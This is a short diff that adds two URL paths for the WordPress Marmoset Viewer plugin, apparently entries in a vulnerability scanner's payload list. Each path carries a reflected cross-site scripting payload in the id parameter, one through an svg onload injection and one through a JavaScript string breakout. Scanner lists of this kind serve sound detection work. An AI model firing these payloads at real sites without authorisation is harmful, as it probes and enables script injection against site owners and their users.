@@ -1,0 +1,2 @@
+/wp-content/plugins/marmoset-viewer/mviewer.php?id=http://</script><svg/onload=alert(%27{{randstr}}%27)>
+/wp-content/plugins/marmoset-viewer/mviewer.php?id=1+http://a.com%27);alert(/{{randstr}}/);marmoset.embed(%27a
